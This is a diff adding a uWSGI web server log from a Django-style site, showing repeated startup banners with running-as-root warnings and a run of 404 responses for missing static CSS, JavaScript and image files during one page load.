@@ -1,0 +1,847 @@
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:19:34 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/axf
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1fba4c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+failed to open python file Mine/wsgi.py
+unable to load app 0 (mountpoint='') (callable not found or import error)
+*** no app loaded. going in full dynamic mode ***
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 11008, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:23:56 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8020 fd 3
+spawned uWSGI http 1 (pid: 11058)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 6
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x19fe560
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x19fe560 pid: 11057 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 11057, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:27:07 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:8020 fd 4
+spawned uWSGI http 1 (pid: 11115)
+uwsgi socket 0 bound to TCP address 127.0.0.1:37019 (port auto-assigned) fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1b415a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1b415a0 pid: 11114 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 11114, cores: 1)
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:28:54 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (0.0.0.0:8020).
+bind(): Address already in use [core/socket.c line 769]
+[pid: 11114|app: 0|req: 1/1] 113.87.160.176 () {40 vars in 701 bytes} [Sat Mar 16 21:29:10 2019] GET /index/ => generated 60066 bytes in 57 msecs (HTTP/1.1 200) 4 headers in 196 bytes (1 switches on core 0)
+Not Found: /static/css/swipet.min-3.4.2.css
+[pid: 11114|app: 0|req: 2/2] 113.87.160.176 () {40 vars in 675 bytes} [Sat Mar 16 21:29:10 2019] GET /static/css/swipet.min-3.4.2.css => generated 4000 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/css/head.css
+[pid: 11114|app: 0|req: 3/3] 113.87.160.176 () {40 vars in 651 bytes} [Sat Mar 16 21:29:10 2019] GET /static/css/head.css => generated 3964 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/css/home_page.css
+[pid: 11114|app: 0|req: 4/4] 119.123.242.52 () {40 vars in 661 bytes} [Sat Mar 16 21:29:10 2019] GET /static/css/home_page.css => generated 3979 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/js/ajax.jQuery-1.8.0.js
+[pid: 11114|app: 0|req: 5/5] 113.87.160.176 () {40 vars in 658 bytes} [Sat Mar 16 21:29:10 2019] GET /static/js/ajax.jQuery-1.8.0.js => generated 3997 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/js/jquery.cookie.js
+[pid: 11114|app: 0|req: 6/6] 119.123.242.52 () {40 vars in 650 bytes} [Sat Mar 16 21:29:10 2019] GET /static/js/jquery.cookie.js => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/weixin2.jpg
+[pid: 11114|app: 0|req: 7/7] 119.123.242.52 () {40 vars in 700 bytes} [Sat Mar 16 21:29:10 2019] GET /static/img/weixin2.jpg => generated 3973 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/js/swiper.min.js
+[pid: 11114|app: 0|req: 8/8] 113.87.160.176 () {40 vars in 644 bytes} [Sat Mar 16 21:29:10 2019] GET /static/js/swiper.min.js => generated 3976 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/weixin.png
+[pid: 11114|app: 0|req: 9/9] 113.87.160.176 () {40 vars in 698 bytes} [Sat Mar 16 21:29:10 2019] GET /static/img/weixin.png => generated 3970 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/zj-logo.png
+[pid: 11114|app: 0|req: 10/10] 119.123.242.52 () {40 vars in 700 bytes} [Sat Mar 16 21:29:10 2019] GET /static/img/zj-logo.png => generated 3973 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_05.jpg
+[pid: 11114|app: 0|req: 11/11] 113.87.160.176 () {40 vars in 712 bytes} [Sat Mar 16 21:29:10 2019] GET /static/img/icon_index_05.jpg => generated 3991 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_06.jpg
+[pid: 11114|app: 0|req: 12/12] 119.123.242.52 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_06.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/2.jpg
+[pid: 11114|app: 0|req: 13/13] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/2.jpg => generated 3955 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/9.jpg
+[pid: 11114|app: 0|req: 14/14] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/9.jpg => generated 3955 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/12.jpg
+[pid: 11114|app: 0|req: 15/15] 119.123.242.52 () {40 vars in 690 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/12.jpg => generated 3958 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/5.jpg
+[pid: 11114|app: 0|req: 16/16] 119.123.242.52 () {40 vars in 688 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/5.jpg => generated 3955 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/banner1.jpg
+[pid: 11114|app: 0|req: 17/17] 113.87.160.176 () {40 vars in 700 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/banner1.jpg => generated 3973 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/13.jpg
+[pid: 11114|app: 0|req: 18/18] 119.123.242.52 () {40 vars in 690 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/13.jpg => generated 3958 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/banner2.jpg
+[pid: 11114|app: 0|req: 19/19] 119.123.242.52 () {40 vars in 700 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/banner2.jpg => generated 3973 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/3.jpg
+[pid: 11114|app: 0|req: 20/20] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/3.jpg => generated 3955 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/6.jpg
+[pid: 11114|app: 0|req: 21/21] 119.123.242.52 () {40 vars in 688 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/6.jpg => generated 3955 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/makesiwei.jpg
+[pid: 11114|app: 0|req: 22/22] 113.87.160.176 () {40 vars in 704 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/makesiwei.jpg => generated 3979 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/zhangyu.jpg
+[pid: 11114|app: 0|req: 23/23] 119.123.242.52 () {40 vars in 700 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/zhangyu.jpg => generated 3973 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/kongfujia.jpg
+[pid: 11114|app: 0|req: 24/24] 119.123.242.52 () {40 vars in 704 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/kongfujia.jpg => generated 3979 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale3.jpg
+[pid: 11114|app: 0|req: 25/25] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale3.jpg => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale4.jpg
+[pid: 11114|app: 0|req: 26/26] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale4.jpg => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale6.jpg
+[pid: 11114|app: 0|req: 27/27] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale6.jpg => generated 3985 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale8.jpg
+[pid: 11114|app: 0|req: 28/28] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale8.jpg => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale1.jpg
+[pid: 11114|app: 0|req: 29/29] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale1.jpg => generated 3985 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale9.jpg
+[pid: 11114|app: 0|req: 30/30] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale9.jpg => generated 3985 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale10.jpg
+[pid: 11114|app: 0|req: 31/31] 113.87.160.176 () {40 vars in 710 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale10.jpg => generated 3988 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale12.jpg
+[pid: 11114|app: 0|req: 32/32] 113.87.160.176 () {40 vars in 710 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/flash_sale12.jpg => generated 3988 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/jxljguanggao.jpg
+[pid: 11114|app: 0|req: 33/33] 113.87.160.176 () {40 vars in 710 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/jxljguanggao.jpg => generated 3988 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (2).jpg
+[pid: 11114|app: 0|req: 34/34] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(2).jpg => generated 3984 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (6).jpg
+[pid: 11114|app: 0|req: 35/35] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(6).jpg => generated 3984 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (3).jpg
+[pid: 11114|app: 0|req: 36/36] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(3).jpg => generated 3984 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (7).jpg
+[pid: 11114|app: 0|req: 37/37] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(7).jpg => generated 3984 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (5).jpg
+[pid: 11114|app: 0|req: 38/38] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(5).jpg => generated 3984 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (9).jpg
+[pid: 11114|app: 0|req: 39/39] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(9).jpg => generated 3984 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (11).jpg
+[pid: 11114|app: 0|req: 40/40] 119.123.242.52 () {40 vars in 710 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/title1%20(11).jpg => generated 3987 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/weibo2.png
+[pid: 11114|app: 0|req: 41/41] 119.123.242.52 () {40 vars in 698 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/weibo2.png => generated 3970 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/weibo.png
+[pid: 11114|app: 0|req: 42/42] 119.123.242.52 () {40 vars in 696 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/weibo.png => generated 3967 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/napagu.jpg
+[pid: 11114|app: 0|req: 43/43] 113.87.160.176 () {40 vars in 698 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/napagu.jpg => generated 3970 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_07.jpg
+[pid: 11114|app: 0|req: 44/44] 113.87.160.176 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_07.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/0606heifang.jpg
+[pid: 11114|app: 0|req: 45/45] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/0606heifang.jpg => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_09.jpg
+[pid: 11114|app: 0|req: 46/46] 113.87.160.176 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_09.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/yidaohong.jpg
+[pid: 11114|app: 0|req: 47/47] 119.123.242.52 () {40 vars in 704 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/yidaohong.jpg => generated 3979 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/chop1.png
+[pid: 11114|app: 0|req: 48/48] 119.123.242.52 () {40 vars in 696 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/chop1.png => generated 3967 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_10.jpg
+[pid: 11114|app: 0|req: 49/49] 113.87.160.176 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_10.jpg => generated 3991 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/chop4.png
+[pid: 11114|app: 0|req: 50/50] 113.87.160.176 () {40 vars in 696 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/chop4.png => generated 3967 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/chop3.png
+[pid: 11114|app: 0|req: 51/51] 119.123.242.52 () {40 vars in 696 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/chop3.png => generated 3967 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_12.jpg
+[pid: 11114|app: 0|req: 52/52] 119.123.242.52 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_12.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/10.jpg
+[pid: 11114|app: 0|req: 53/53] 113.87.160.176 () {40 vars in 690 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/10.jpg => generated 3958 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/weixin2.jpg
+[pid: 11114|app: 0|req: 54/54] 119.123.242.52 () {40 vars in 700 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/weixin2.jpg => generated 3973 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/8.jpg
+[pid: 11114|app: 0|req: 55/55] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/8.jpg => generated 3955 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_03.jpg
+[pid: 11114|app: 0|req: 56/56] 113.87.160.176 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_03.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_02.jpg
+[pid: 11114|app: 0|req: 57/57] 119.123.242.52 () {40 vars in 712 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/icon_index_02.jpg => generated 3991 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/hot.png
+[pid: 11114|app: 0|req: 58/58] 119.123.242.52 () {40 vars in 692 bytes} [Sat Mar 16 21:29:11 2019] GET /static/img/hot.png => generated 3961 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/11.jpg
+[pid: 11114|app: 0|req: 59/59] 119.123.242.52 () {40 vars in 690 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/11.jpg => generated 3958 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/guotai.jpg
+[pid: 11114|app: 0|req: 60/60] 113.87.160.176 () {40 vars in 698 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/guotai.jpg => generated 3970 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/1.jpg
+[pid: 11114|app: 0|req: 61/61] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/1.jpg => generated 3955 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale2.jpg
+[pid: 11114|app: 0|req: 62/62] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/flash_sale2.jpg => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale5.jpg
+[pid: 11114|app: 0|req: 63/63] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/flash_sale5.jpg => generated 3985 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale7.jpg
+[pid: 11114|app: 0|req: 64/64] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/flash_sale7.jpg => generated 3985 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/xifeng.jpg
+[pid: 11114|app: 0|req: 65/65] 113.87.160.176 () {40 vars in 698 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/xifeng.jpg => generated 3970 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (12).jpg
+[pid: 11114|app: 0|req: 66/66] 113.87.160.176 () {40 vars in 710 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/title1%20(12).jpg => generated 3987 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (4).jpg
+[pid: 11114|app: 0|req: 67/67] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/title1%20(4).jpg => generated 3984 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (10).jpg
+[pid: 11114|app: 0|req: 68/68] 113.87.160.176 () {40 vars in 710 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/title1%20(10).jpg => generated 3987 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/of.jpg
+[pid: 11114|app: 0|req: 69/69] 119.123.242.52 () {40 vars in 690 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/of.jpg => generated 3958 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/jiekedanni.jpg
+[pid: 11114|app: 0|req: 70/70] 119.123.242.52 () {40 vars in 706 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/jiekedanni.jpg => generated 3982 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_08.jpg
+[pid: 11114|app: 0|req: 71/71] 119.123.242.52 () {40 vars in 712 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/icon_index_08.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/qr-p.jpg
+[pid: 11114|app: 0|req: 72/72] 119.123.242.52 () {40 vars in 694 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/qr-p.jpg => generated 3964 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/chop5.png
+[pid: 11114|app: 0|req: 73/73] 113.87.160.176 () {40 vars in 696 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/chop5.png => generated 3967 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_04.jpg
+[pid: 11114|app: 0|req: 74/74] 119.123.242.52 () {40 vars in 712 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/icon_index_04.jpg => generated 3991 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/banner4.jpg
+[pid: 11114|app: 0|req: 75/75] 119.123.242.52 () {40 vars in 700 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/banner4.jpg => generated 3973 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/4.jpg
+[pid: 11114|app: 0|req: 76/76] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/4.jpg => generated 3955 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/flash_sale11.jpg
+[pid: 11114|app: 0|req: 77/77] 119.123.242.52 () {40 vars in 710 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/flash_sale11.jpg => generated 3988 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
